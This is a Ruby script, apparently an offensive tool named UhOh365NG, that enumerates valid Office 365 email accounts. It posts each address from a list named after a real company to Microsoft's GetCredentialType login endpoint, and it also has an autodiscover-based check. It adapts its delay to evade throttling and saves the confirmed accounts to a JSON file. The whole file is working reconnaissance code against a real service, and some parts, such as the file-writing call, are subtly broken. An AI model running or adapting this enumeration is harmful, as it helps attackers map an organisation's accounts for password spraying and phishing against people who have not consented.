#!/usr/bin/env ruby
require "mechanize"
require "benchmark"
require "net/http"
require "uri"
require "json"
require "colorize"

class UhOh365NG
  attr_accessor :wait

  def initialize
    @agent = Mechanize.new
    @wait = 0.8
  end

  def verify_v1(email)
    # Same method as UhOh365
    @agent.request_headers = {"Accept" => "application/json"}
    @agent.user_agent = "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"
    begin

      Timeout::timeout(30) do
        code = @agent.get("https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/#{email}?Protocol=Autodiscoverv1").code
        return [email, code.to_i]
      end

    rescue Exception => e
      return [email, 302]
    end
  end

  def verify_v2(email)
    begin
      uri = URI.parse("https://login.microsoftonline.com/common/GetCredentialType")
      request = Net::HTTP::Post.new(uri)
      request.body = JSON.dump({
        "username" => email,
        "isOtherIdpSupported" => true,
        "checkPhones" => false,
        "isRemoteNGCSupported" => true,
        "isCookieBannerShown" => false,
        "isFidoSupported" => true,
      })
      req_options = {use_ssl: uri.scheme == "https"}

      response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
      end

      if JSON.parse(response.body)["IfExistsResult"] == 0 and JSON.parse(response.body)["ThrottleStatus"] == 0
        valid = true
        throttled = false
      elsif JSON.parse(response.body)["ThrottleStatus"] == 1
        valid = false
        throttled = true
        puts("[-] We're being throttled now! Waiting and increasing wait by 1.7x")
        @wait *= 1.7
        puts("Wait set to #{wait}")
        puts("Sleeping #{@wait * 10}")
        sleep(@wait * 8)
      else
        if JSON.parse(response.body)["ThrottleStatus"] == 1
          throttled = true
        end

        valid = false
      end

      return [email, valid, throttled]
    rescue Exception => e
      return [email, false, throttled]
    end
  end
end

@threads = []
@data = []
i = 0
verifier = UhOh365NG.new

File.read("gymshark.txt").split("\n") do |email|
  valid = false
  throttled = true
  while throttled

    time = Benchmark.measure do
      email, valid, throttled = verifier.verify_v2(email)
    end

    i += 1


    if valid
      @data.push({
        "id" => i,
        "email" => email,
        "valid" => valid,
        "throttled" => throttled,
        "time" => time.real,
      })
      puts(({
        "id" => i,
        "email" => email,
        "valid" => valid,
        "throttled" => throttled,
        "time" => time.real,
      }.to_s).blue)
    else
      puts(({
        "id" => i,
        "email" => email,
        "valid" => false,
        "throttled" => throttled,
        "time" => time.real,
      }.to_s).red)
    end
  end

  # end
  sleep(verifier.wait)
end

@threads.each(&:join)
File.open("save.json") { |file| file.write(JSON.pretty_generate(@data)) }
puts("Discovered #{@data.length} valid emails")
